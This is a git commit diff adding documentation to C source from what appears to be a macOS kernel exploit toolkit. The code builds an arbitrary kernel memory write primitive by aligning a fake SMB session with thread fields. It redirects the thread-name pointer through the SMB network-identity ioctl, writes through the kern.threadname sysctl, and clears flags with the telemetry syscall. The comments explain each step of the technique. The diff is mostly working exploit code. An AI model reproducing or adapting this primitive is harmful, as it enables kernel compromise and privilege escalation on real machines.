bd83558488fa7488057101051f09a6cbde70c6fe
Sreejith Krishnan R <hello.sreejith@pm.me>
2022-03-15 11:04:03 -0700

    Add documentation

--- xe_kmem/xe_kmem/kmem_write_session.c
+++ xe_kmem/xe_kmem/kmem_write_session.c
@@ -27,6 +27,51 @@
 extern int __telemetry(uint64_t cmd, uint64_t deadline, uint64_t interval, uint64_t leeway, uint64_t arg4, uint64_t arg5);
 
 
+/*
+ * The ioctl command of type SMBIOC_NTWRK_IDENTITY is used the set the network user
+ * identitiy of a smb session. This ioctl command is handled by method `smb_usr_set_network_identity`
+ * as shown below
+ *
+ * int smb_usr_set_network_identity(struct smb_session *sessionp, struct smbioc_ntwrk_identity *ntwrkID)
+ * {
+ *     if (sessionp->session_flags & SMBV_NETWORK_SID) {
+ *         return EEXIST;
+ *     }
+ *
+ *     if (ntwrkID->ioc_ntsid_len != sizeof(ntsid_t)) {
+ *         return EINVAL;
+ *     }
+ *     memcpy(&sessionp->session_ntwrk_sid, &ntwrkID->ioc_ntsid, (size_t)ntwrkID->ioc_ntsid_len);
+ *     sessionp->session_flags |= SMBV_NETWORK_SID;
+ *     return 0;
+ * }
+ *
+ * The code path handling the SMBIOC_NTWRK_IDENTITY ioctl will only access fields
+ * `sessionp->session_flags` and `sessionp->session_ntwrk_sid`. By adjusting the value of
+ * `smb_dev->sd_session` pointer we can use this ioctl command to write data to a arbitary location
+ * in kernel memory. But there are two disadvantages of using this method :-
+ *
+ * 1) For the write to happen, SMBV_NETWORK_SID flag in `sessionp->session_flags` must be cleared.
+ *    When writing to arbitary kernel memory location, this condition may not always be satisfied
+ * 2) Once the write is done, SMBV_NETWORK_SID flag in `sessionp->session_flags` is set which may
+ *    cause unintented side effects
+ *
+ * These disadvantages limits this method from being used directly as a powerful arbitary memory write
+ * primitive. But this method can be used to control pointers in other data structures which inturn
+ * can then write to arbitary kernel memory locations.
+ *
+ * In `struct thread` data structure, the member `thread_name` is a pointer to dynamically allocated
+ * buffer. This buffer is used for storing the thread name which can be written using "kern.threadname"
+ * sysctl. Another member in thread, `ith_voucher_name` can be controlled using the `telemetry`
+ * syscall. By aligning the member `sessionp->session_flags` with `thread->ith_voucher_name`
+ * we can build a general purpose arbitary kernel memory writer. The `SMBV_NETWORK_SID` ioctl command
+ * can be used to set the value of pointer `thread->thread_name`. Then the "kern.threadname" sysctl
+ * can be used to write data to the address in `thread->thread_name`. To perform another kernel memory
+ * write, the `SMBV_NETWORK_SID` flag set on `sessionp->session_flags` must be cleared which can be
+ * done using the `telemetry` syscall
+ */
+
+
 struct kmem_write_session {
     uintptr_t thread;
     uint64_t thread_id;
@@ -42,6 +87,7 @@ uint64_t kmem_write_session_get_thread_id(void) {
 }
 
 
+// Create a fake smb_session that can be used for arbitary kernel memory write
 kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_addr) {
     uintptr_t thread = xe_xnu_thread_current_thread();
     
@@ -49,10 +95,12 @@ kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_add
     xe_assert_cond(xe_kmem_read_uint32(ith_voucher_name, 0), ==, 0);
     uintptr_t thread_name = thread + TYPE_THREAD_MEM_THREAD_NAME_OFFSET;
     
+    /// Align `thread->ith_voucher_name` with `sessionp->session_flags`
     uintptr_t session = ith_voucher_name - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
+    
+    /// Make sure that `thread->thread_name` pointer can be controlled by writing to `sessionp->session_ntwrk_sid`
     uintptr_t write_start = session + TYPE_SMB_SESSION_MEM_SESSION_NTWRK_SID_OFFSET;
     uintptr_t write_end = write_start + sizeof(ntsid_t);
-    
     xe_assert_cond(write_end, <=, thread + TYPE_THREAD_SIZE);
     xe_assert_cond(write_start, <=, thread_name);
     xe_assert_cond(thread_name + sizeof(uintptr_t), <=, write_end);
@@ -65,13 +113,18 @@ kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_add
     return ws;
 }
 
+
+// Write data of size 64 bytes to arbitary kernel memory location
 void kmem_write_session_write_block(kmem_write_session_t session, int smb_dev, uintptr_t dst, char data[MAXTHREADNAMESIZE]) {
+    /// Since `thread_name` is a C string, the "kern.threadname" sysctl handler always set the last byte
+    /// to null byte. This assertion makes sure the caller is aware of this limitation
     xe_assert_cond(data[MAXTHREADNAMESIZE - 1], ==, '\0');
     xe_assert_cond(kmem_write_session_get_thread_id(), ==, session->thread_id);
         
     uintptr_t thread = session->thread;
     uintptr_t smb_session = thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
     
+    /// Clear SMBV_NETWORK_SID flag from `sessionp->session_flags`
     int res = __telemetry(2, 0, 0, 0, 0, 0);
     xe_assert_errno(res);
     
@@ -80,23 +133,32 @@ void kmem_write_session_write_block(kmem_write_session_t session, int smb_dev, u
     
     ntsid_t ntsid = session->write_data;
     *((uint64_t*)((char*)&ntsid + (thread_name - write_start))) = dst;
+    
+    /// Sets the value of `thread->thread_name` pointer to dst
     int error = smb_client_ioc_set_ntwrk_identity(smb_dev, &ntsid);
     xe_assert_err(error);
     
+    /// Writes data to dst
     res = sysctlbyname("kern.threadname", NULL, NULL, data, MAXTHREADNAMESIZE - 1);
     xe_assert_errno(res);
     
+    /// Clear SMBV_NETWORK_SID flag on `sessionp->session_flags` set by previous ioctl
     res = __telemetry(2, 0, 0, 0, 0, 0);
     xe_assert_errno(res);
     
+    /// Restore the `thread->thread_name` pointer back to original value
     error = smb_client_ioc_set_ntwrk_identity(smb_dev, &session->write_data);
     xe_assert_err(error);
 }
 
+
+// Returns the address of fake smb_session which can be set to `smb_dev->sd_session`
+// using `smb_dev_rw.c`
 uintptr_t kmem_write_session_get_addr(kmem_write_session_t session) {
     uintptr_t thread = session->thread;
     return thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
 }
+
 
 void kmem_write_session_destroy(kmem_write_session_t* session_p) {
     uintptr_t thread = xe_xnu_thread_current_thread();
--- xe_kmem/xe_kmem/kmem_write_session.h
+++ xe_kmem/xe_kmem/kmem_write_session.h
@@ -13,9 +13,23 @@
 
 typedef struct kmem_write_session* kmem_write_session_t;
 
+/// Create a new fake smb_session for arbitary kernel memory write
+/// @param smb_addr Socket address of the xe_smbx server
 kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_addr);
+
+/// Writes data from `data` to `dst` kernel memory address
+/// @param session The session created using `kmem_write_session_create` method
+/// @param smb_dev File descriptor of the smb dev whose `smb_dev->sd_session = fake_session`
+/// @param dst Address of destination kernel memory
+/// @param data Data to be written to dst. Data must be of size 64 and last byte in data should be null byte
 void kmem_write_session_write_block(kmem_write_session_t session, int smb_dev, uintptr_t dst, char data[MAXTHREADNAMESIZE]);
+
+/// Returns the address of fake_session which can be used for arbitary kernel memory write
+/// @param session The session created using `kmem_write_session_create` method
 uintptr_t kmem_write_session_get_addr(kmem_write_session_t session);
+
+/// Release resources
+/// @param session_p Pointer to session created using `kmem_write_session_create` method
 void kmem_write_session_destroy(kmem_write_session_t* session_p);
 
 #endif /* kmem_write_session_h */
